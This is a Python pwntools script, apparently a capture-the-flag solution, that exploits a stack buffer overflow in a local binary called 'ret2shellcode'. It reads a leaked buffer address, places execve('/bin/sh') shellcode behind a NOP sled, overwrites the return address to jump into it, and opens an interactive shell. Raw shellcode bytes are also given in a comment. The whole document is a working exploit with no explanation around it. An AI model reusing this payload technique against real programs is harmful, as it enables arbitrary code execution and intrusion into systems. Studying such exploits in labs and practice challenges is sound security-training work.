#!/usr/bin/python3
from pwn import *

# Set up the binary and process
context.binary = elf = ELF('./ret2shellcode')
io = process()

# Receive the leaked address
io.recvuntil(b': ')
leak = int(io.recv(14), 16)
log.info(f"Leaked buffer address: {hex(leak)}")

# Shellcode for execve("/bin/sh", 0, 0)
# This is a more reliable shellcode
shellcode = asm(shellcraft.sh())
# Alternative if the above doesn't work:
# shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

# Construct the payload
payload = b""
payload += shellcode.ljust(264, b"\x90")  # Shellcode + NOP sled to fill 264 bytes
payload += p64(leak)                      # Overwrite return address with buffer address

# Send the payload
io.sendline(payload)
io.interactive()
